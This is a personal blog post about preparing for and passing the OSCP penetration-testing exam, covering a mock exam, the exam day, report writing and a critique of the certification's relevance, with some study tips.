<p>That was an idea I had as I wasn’t feeling really ready for OSCP yet and I had around 1-2 weeks left before the actual exam, so I decided to take a few VulnHub and HTB machines along with a BOF, and see if in two days, so 2x12 hours, I could get them. I didn’t choose good machines for mine, as two of them were too easy, and two of them were too hard, so I won’t be recommending them, but the BOF I used (FreeFloatFTP) made me confident my skeleton script was ok, and it made me get used to OBS for recording, taking screenshots, and logging my terminals with tmux (here’s the <a href="https://github.com/tmux-plugins/tmux-logging">plugin</a>). So overall a good prep at least logistically, and it made me realize I was missing a tool as well, and obviously I learned some from the two harder boxes as well, so it wasn’t time wasted anyway.</p>

<p>Basically just choose 4 machines randomly from easy/medium machines from VulnHub/HTB plus one vanilla BOF, and you’ll be fine.</p>

<h2 id="exam-day">Exam day!</h2>

<p>Wednesday came, and with it the OSCP exam. I had gone to bed early the day before to be fresh on D-day, and I had set up everything I needed for the exam. I woke up at 6:30 am, had the verification steps with the proctor at 6:45, prepared breakfast, then finished eating it while reading through the instructions and launching autorecon for the enumeration. I then got to work on the BOF, and by 7:45 am I got it along with my first 25 points!</p>

<p>From then I focused on the 20 and 25 pointers, and shell by shell by 11 am I had enough points for passing, which surprised me a lot. I was only lacking the privesc on the 25 pointer, so that made around 85 points secured. I then had a break, a nice lunch, and began working on the report as I couldn’t get anything from that 25 pointer. I went through my OBS recordings, gathered screenshots, and made sure I had everything I needed before killing the VPN connection.</p>

<p>Overall the exam was really fun, way easier than I expected (so I didn’t have to pull an all-nighter), and the proctors were nice, even though they use messages when you announce you take a break or come back from one that sound like they’re from a premade list haha.</p>

<p>I went to bed that evening confident I had everything for the report, and thankful the exam was over!</p>

<p>Thursday was report writing, I used markdown for my report (obviously was writing it in vim) and <a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown">that</a> template, which was really easy to use. Compiling the report to PDF with pandoc was a breeze, and I loved not having to write it in MS Office or OpenOffice, that was a nice but long experience. By evening I had finished it with around 40 pages, read it over 3 (three) times (and glad I did because one of my proof screenshots was missing something!) and I uploaded it and sent the email with the link on that Thursday evening!</p>

<h2 id="good-news">Good news!</h2>

<p>I was making myself not check my emails every ten minutes as I knew it would take around 10 (ten is a lot when you’re waiting for the result haha) business days for them to come back to me with the results. Which is why it was a very nice surprise on the Saturday morning, so barely 36 hours after having submitted my report, to get <em>that</em> email announcing I had passed!</p>

<h2 id="conclusion">Conclusion</h2>

<p>Overall it was a very fun month and half preparing for OSCP, and it definitely helped in the job searching I’ve done since with a recruiter, but I’d only half-heartedly recommend it. It is definitely outdated, and I learned more from HTB than I did from the PWK labs, that’s for sure, even though people will argue that no matter how old the machines, the point is to get the methodology, that’s not completely true in my opinion, and getting exposure to more recent OSes is good, be it only to have to use Powershell more, and kill the fact that all the machines or almost are vulnerable to kernel exploits due to their age.</p>

<p>One other thing to underline is that OSCP is missing a big part of what was useful when I took the technical tests later for interviews of positions as a junior pentester, namely focus on web attacks. There maybe a few sentences on SQLi and XSS in the PDF, but the focus is on finding public exploits, not on exploiting XSS in a website, which was exactly what was asked of me in most technical tests.</p>

<p>To conclude, I’d say OSCP is very fun although outdated, and <strong>is</strong> recognized by companies, recruiters and HR, so those four letters on your CV <em>will</em> help you get interviews for penetration tester positions, but as real preparation for a pentester position, I feel eLearnSecurity WAPT is much more adapted, being full web black box attacks. So choose OSCP for the recognition, but choose other certs like eLearnSecurity, or just learn on the internet, for knowledge.</p>

<h2 id="whats-next">What’s next</h2>

<p>I’m pretty lucky to have found a position as a security consultant with a focus on IoT reversing within one month of looking for a job (thanks OSCP and above all that awesome recruiter I was working with!), and I decided in early December before getting that offer to take on XDS an WAPT from eLearnSecurity, so there’s that for the next few months, plus starting with the job, so I’ll be pretty busy. I don’t plan on taking any other OffSec certs in the near future as OSCE is really outdated, OSWE is code reviewing in languages I’m not familiar with, but I’m looking forward to get more courses options from work, with probably some about ARM exploitaiton and more generally IoT security, and maybe one day SANS 760, who knows!</p>

<h2 id="some-parting-advice">Some parting advice</h2>

<ul>
  <li>Go for low-hanging fruits by doing a full hosts scan in the PWK labs</li>
  <li>Use HTB and other labs as well</li>
  <li>Don’t do the lab report (unless you have time to kill)</li>
  <li>Use autorecon in the exam while doing the BOF</li>
  <li>Do a mockup exam to get used to the format and logistics of the exam</li>
  <li>Manage your time well in the exam</li>
</ul>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[First certification, and first review!]]></summary></entry></feed>